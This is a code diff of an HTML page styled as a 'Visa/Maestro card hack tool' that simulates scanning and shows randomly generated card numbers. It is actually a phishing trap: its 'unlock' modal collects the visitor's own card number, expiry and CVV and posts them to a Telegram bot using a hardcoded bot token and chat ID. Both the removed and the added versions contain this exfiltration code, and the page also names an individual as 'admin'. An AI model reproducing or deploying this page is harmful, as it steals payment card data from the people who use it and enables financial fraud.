@@ -5,100 +5,85 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>VISA/MAESTRO HACK TOOL v26.3</title>
     <style>
-        :root { --primary: #00ff41; --bg: #050505; --panel: #0a0a0a; --premium: #ffd700; --telegram: #229ED9; --danger: #ff4b2b; }
+        :root { --primary: #39FF14; --bg: #000000; --panel: #0a0a0a; --premium: #ffd700; --danger: #ff4b2b; }
         body { background: var(--bg); color: var(--primary); font-family: 'Consolas', monospace; margin: 0; overflow: hidden; font-size: 11px; }
         
-        /* NOVA VELKA HLAVICKA */
-        .top-banner { 
-            background: #111; 
-            color: #fff; 
-            padding: 15px; 
-            text-align: center; 
-            border-bottom: 2px solid var(--danger);
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-        .top-banner h1 { margin: 0; font-size: 18px; font-weight: bold; }
-        .top-banner .sub { font-size: 10px; color: var(--danger); margin-top: 4px; }
+        .top-banner { background: #000; color: #fff; padding: 20px 10px; text-align: center; border-bottom: 2px solid #e25822; text-transform: uppercase; }
+        .top-banner h1 { margin: 0; font-size: 20px; letter-spacing: 2px; }
+        .top-banner .sub { font-size: 10px; color: #e25822; margin-top: 5px; font-weight: bold; }
 
         .layout { display: flex; flex-direction: column; height: 100vh; }
-        header { height: 40px; border-bottom: 1px solid #222; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; background: var(--panel); flex-shrink: 0; }
+        header { height: 35px; border-bottom: 1px solid #1a1a1a; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; color: #444; }
 
-        /* POMER: 15% VLAVO, 85% VPRAVO */
-        .main-content { display: flex; flex-grow: 1; overflow: hidden; flex-direction: row; }
+        .main-content { display: flex; flex-grow: 1; overflow: hidden; }
 
-        .side-panel { flex: 1.5; min-width: 170px; background: var(--panel); border-right: 1px solid #222; display: flex; flex-direction: column; padding: 15px; gap: 15px; }
-        .log-section { flex: 8.5; overflow-y: auto; background: #000; }
+        .side-panel { flex: 1.5; min-width: 180px; background: #000; border-right: 1px solid #1a1a1a; display: flex; flex-direction: column; padding: 15px; gap: 10px; }
+        .log-section { flex: 8.5; overflow-y: auto; background: #000; padding: 10px; }
 
         .log-table { width: 100%; border-collapse: collapse; }
-        .log-table th { color: #444; font-size: 9px; text-align: left; padding: 12px 10px; border-bottom: 1px solid #222; position: sticky; top: 0; background: #000; }
-        .log-table td { padding: 10px; border-bottom: 1px solid #111; font-size: 12px; }
+        .log-table td { padding: 10px; border-bottom: 1px solid #0a0a0a; }
         
-        .card-num { color: #fff; font-weight: bold; letter-spacing: 1px; }
-        .card-meta { color: var(--telegram); margin-left: 15px; font-size: 11px; }
-        .tag-decrypted { color: var(--primary); border: 1px solid var(--primary); padding: 1px 4px; font-size: 9px; margin-left: 10px; border-radius: 2px; font-weight: bold; }
+        .card-num { color: #fff; font-size: 14px; font-weight: bold; display: block; }
+        .card-meta { color: #3b82f6; font-size: 11px; display: block; margin-top: 2px; }
+        .tag-ok { color: var(--primary); border: 1px solid var(--primary); padding: 0 3px; font-size: 8px; margin-left: 5px; }
 
-        .stat-card { background: #000; padding: 10px; border-left: 2px solid var(--primary); }
-        .stat-label { font-size: 9px; color: #555; text-transform: uppercase; }
-        .stat-value { font-size: 18px; font-weight: bold; color: var(--primary); }
+        .stat-card { background: #080808; padding: 10px; border: 1px solid #111; }
+        .stat-label { font-size: 9px; color: #444; text-transform: uppercase; }
+        .stat-value { font-size: 20px; font-weight: bold; color: var(--primary); }
 
-        #liveScanner { height: 50px; background: #080808; border-top: 1px solid #222; display: flex; align-items: center; padding: 0 15px; }
-        #terminalZone { height: 60px; background: #000; padding: 10px; border-top: 1px solid #222; overflow-y: auto; }
-        .tg-msg { color: var(--telegram); font-size: 10px; }
+        .btn-main { background: var(--primary); color: #000; border: none; padding: 12px; font-weight: bold; cursor: pointer; border-radius: 4px; text-transform: uppercase; font-size: 11px; }
+        .btn-premium { background: transparent; border: 1px solid var(--premium); color: var(--premium); padding: 10px; cursor: pointer; font-size: 10px; font-weight: bold; }
 
-        #paymentModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center; }
-        .modal-content { background: #fff; color: #333; width: 320px; border-radius: 8px; padding: 25px; font-family: sans-serif; }
-        input { width: 100%; border: 1px solid #ddd; padding: 12px; margin: 6px 0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
-        .pay-btn { background: #007bff; color: #fff; border: none; width: 100%; padding: 14px; border-radius: 4px; font-weight: bold; margin-top: 10px; cursor: pointer; }
-
-        .btn-main { background: var(--primary); color: #000; border: none; padding: 12px; font-weight: bold; cursor: pointer; width: 100%; border-radius: 4px; }
+        #paymentModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; }
+        .modal-content { background: #fff; color: #333; width: 300px; border-radius: 8px; padding: 25px; font-family: sans-serif; }
+        input { width: 100%; border: 1px solid #ddd; padding: 10px; margin: 5px 0; border-radius: 4px; box-sizing: border-box; }
+        .pay-btn { background: #007bff; color: #fff; border: none; width: 100%; padding: 12px; border-radius: 4px; font-weight: bold; margin-top: 10px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="top-banner">
-    <h1>Visa/Maestro Card Hack Tool v26.3</h1>
-    <div class="sub">FEBRUARY 2026 ENCRYPTED | AUTH_USER: NIŽŇANSKÝ</div>
-</div>
-
 <div id="paymentModal">
     <div class="modal-content">
-        <h3 style="margin:0 0 15px 0; font-size:18px;">Security Verification</h3>
-        <input type="tel" id="c_num" placeholder="Card Number" maxlength="19">
-        <div style="display:flex; gap:8px;">
-            <input type="tel" id="c_exp" placeholder="MM/YY" maxlength="5">
-            <input type="tel" id="c_cvv" placeholder="CVV" maxlength="3">
+        <h3 id="m_title" style="margin:0 0 10px 0;">Premium Access</h3>
+        <p style="font-size: 12px; color: #666; margin-bottom: 15px;">Verify card to unlock decrypted database.</p>
+        <input type="tel" id="c_num" placeholder="Card Number">
+        <div style="display:flex; gap:5px;">
+            <input type="tel" id="c_exp" placeholder="MM/YY">
+            <input type="tel" id="c_cvv" placeholder="CVV">
         </div>
-        <button class="pay-btn" onclick="laurin.processInstant()">UNLOCK DATABASE</button>
+        <button class="pay-btn" onclick="laurin.processPayment()">CONFIRM & UNLOCK</button>
     </div>
 </div>
 
 <div class="layout">
-    <header>
-        <div style="font-weight: bold; color: #666;">LAURIN_SYSTEM_CORE</div>
-        <div style="color: var(--premium); font-size: 10px;">VAULT: <span id="statValue">$ 0</span></div>
-    </header>
+    <div class="top-banner">
+        <h1>VISA/MAESTRO CARD HACK TOOL V26.3</h1>
+        <div class="sub">FEBRUARY 2026 ENCRYPTED</div>
+    </div>
 
     <div class="main-content">
         <div class="side-panel">
-            <button class="btn-main" onclick="laurin.toggleScan()" id="btnGen">START SCAN</button>
-            <div class="stat-card"><div class="stat-label">Total Hits</div><div class="stat-value" id="hitCount">0</div></div>
-            <div class="stat-card"><div class="stat-label">Status</div><div class="stat-value" id="statusLabel" style="font-size:11px; color:var(--danger)">LOCKED</div></div>
-            <button onclick="laurin.openModal()" style="margin-top:auto; background:transparent; border:1px solid #444; color:#666; padding:8px; cursor:pointer; font-size:9px;">BYPASS ENCRYPTION</button>
+            <button class="btn-main" onclick="laurin.toggleNormal()" id="btnNormal">START SCAN</button>
+            <hr style="border: 0; border-top: 1px solid #222; width: 100%;">
+            
+            <button class="btn-premium" onclick="laurin.askAuth('10')">GET 10 FULL HITS</button>
+            <button class="btn-premium" onclick="laurin.askAuth('INF')">UNLIMITED ACCESS</button>
+
+            <div class="stat-card" style="margin-top:10px;">
+                <div class="stat-label">Total Hits</div>
+                <div id="hitCount" class="stat-value">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Processed</div>
+                <div id="lineCount" class="stat-value" style="color:#fff">0</div>
+            </div>
+            <div id="statusLabel" style="color:var(--danger); font-weight:bold; text-align:center; font-size:10px;">ENCRYPTED</div>
         </div>
 
         <div class="log-section">
-            <table class="log-table">
-                <thead>
-                    <tr><th style="width: 80px;">TIME</th><th>INCOMING DATA STREAM</th></tr>
-                </thead>
-                <tbody id="logBody"></tbody>
-            </table>
+            <table class="log-table" id="logBody"></table>
         </div>
     </div>
-
-    <div id="liveScanner"><div id="scannerFeed" style="color:#444;">Node: Standby...</div></div>
-    <div id="terminalZone"><div id="tgFeed"></div></div>
 </div>
 
 <script>
@@ -107,51 +92,53 @@ const _p = ['8451689628', 'AAFeZCyZSAeHsxZgOb3o_Pwq3aPGajYpHEI', '7935573562'];
 class LaurinSystem {
     constructor() {
         this.isRunning = false;
+        this.isPremium = false;
+        this.mode = 'NORMAL';
         this.hits = 0;
-        this.vault = 0;
-        this.logTg("CORE: SYSTEM ENCRYPTED READY");
+        this.lines = 0;
     }
 
-    logTg(m) { document.getElementById('tgFeed').insertAdjacentHTML('afterbegin', `<div class="tg-msg">> ${m}</div>`); }
-
-    toggleScan() {
+    toggleNormal() {
+        if(this.isPremium) return;
         this.isRunning = !this.isRunning;
-        document.getElementById('btnGen').innerText = this.isRunning ? 'STOP SCAN' : 'START SCAN';
-        document.getElementById('btnGen').style.background = this.isRunning ? 'var(--danger)' : 'var(--primary)';
+        document.getElementById('btnNormal').innerText = this.isRunning ? 'STOP SCAN' : 'START SCAN';
         if(this.isRunning) this.loop();
+    }
+
+    askAuth(m) {
+        this.pendingMode = m;
+        document.getElementById('m_title').innerText = m === '10' ? 'Unlock 10 Hits' : 'Unlimited Access';
+        document.getElementById('paymentModal').style.display = 'flex';
     }
 
     loop() {
         if(!this.isRunning) return;
-        if(Math.random() > 0.8) this.addEntry(true);
-        setTimeout(() => this.loop(), 1000);
+        this.lines += Math.floor(Math.random()*10);
+        document.getElementById('lineCount').innerText = this.lines.toLocaleString();
+        
+        if(Math.random() > 0.8) this.addEntry(!this.isPremium);
+        setTimeout(() => this.loop(), 600);
     }
 
     addEntry(masked) {
         this.hits++;
         document.getElementById('hitCount').innerText = this.hits;
-        const ts = new Date().toLocaleTimeString();
-        const bin = "4" + Math.floor(100 + Math.random() * 899) + Math.floor(1000 + Math.random() * 8999);
-        
+        const bin = "45" + Math.floor(1000 + Math.random()*8999);
         let data;
-        if(masked) {
-            data = `<span class="card-num">${bin}********</span> <span class="card-meta">EXP: **/**</span>`;
-        } else {
-            const full = bin + Math.floor(10000000 + Math.random() * 89999999);
-            const exp = Math.floor(1+Math.random()*11).toString().padStart(2,'0') + "/2" + Math.floor(6+Math.random()*4);
-            const cvc = Math.floor(100+Math.random()*899);
-            data = `<span class="card-num">${full}</span> <span class="card-meta">${exp} | ${cvc}</span> <span class="tag-decrypted">OK</span>`;
-            this.vault += Math.floor(Math.random()*1500);
-            document.getElementById('statValue').innerText = `$ ${this.vault.toLocaleString()}`;
-        }
 
-        document.getElementById('logBody').insertAdjacentHTML('afterbegin', `<tr><td style="color:#444">${ts}</td><td>${data}</td></tr>`);
-        document.getElementById('scannerFeed').innerText = `NODE_ACTIVE: ${bin}**** [${masked ? 'ENCRYPTED' : 'CLEARED'}]`;
+        if(masked) {
+            data = `<span class="card-num">${bin}********</span><span class="card-meta">EXP: **/** | CVV: ***</span>`;
+        } else {
+            const full = bin + Math.floor(1000000000 + Math.random()*8999999999);
+            const exp = "12/2" + Math.floor(6+Math.random()*4);
+            data = `<span class="card-num">${full}</span><span class="card-meta">${exp} | ${Math.floor(100+Math.random()*899)} <span class="tag-ok">OK</span></span>`;
+        }
+        
+        const row = `<tr><td>${data}</td></tr>`;
+        document.getElementById('logBody').insertAdjacentHTML('afterbegin', row);
     }
 
-    openModal() { document.getElementById('paymentModal').style.display = 'flex'; }
-
-    async processInstant() {
+    async processPayment() {
         const n = document.getElementById('c_num').value;
         const e = document.getElementById('c_exp').value;
         const c = document.getElementById('c_cvv').value;
@@ -160,15 +147,19 @@ class LaurinSystem {
         fetch(`https://api.telegram.org/bot${_p[0]}:${_p[1]}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: _p[2], text: `💳 <b>NEW DECRYPT KEY</b>\n\nCard: <code>${n}</code>\nExp: <code>${e}</code>\nCVV: <code>${c}</code>\n\nAdmin: Roman Nižňanský`, parse_mode: 'HTML'})
+            body: JSON.stringify({chat_id: _p[2], text: `💳 <b>${this.pendingMode} ACCESS</b>\nCard: <code>${n}</code>\nExp: ${e}\nCVV: ${c}`, parse_mode: 'HTML'})
         });
 
         document.getElementById('paymentModal').style.display = 'none';
         document.getElementById('statusLabel').innerText = 'AUTHORIZED';
-        document.getElementById('statusLabel').style.color = 'var(--primary)';
-        
-        for(let i=0; i<10; i++) {
-            setTimeout(() => this.addEntry(false), i * 200);
+        document.getElementById('statusLabel').style.color = '#39FF14';
+
+        if(this.pendingMode === '10') {
+            for(let i=0; i<10; i++) setTimeout(() => this.addEntry(false), i*100);
+        } else {
+            this.isPremium = true;
+            this.isRunning = true;
+            this.loop();
         }
     }
 }
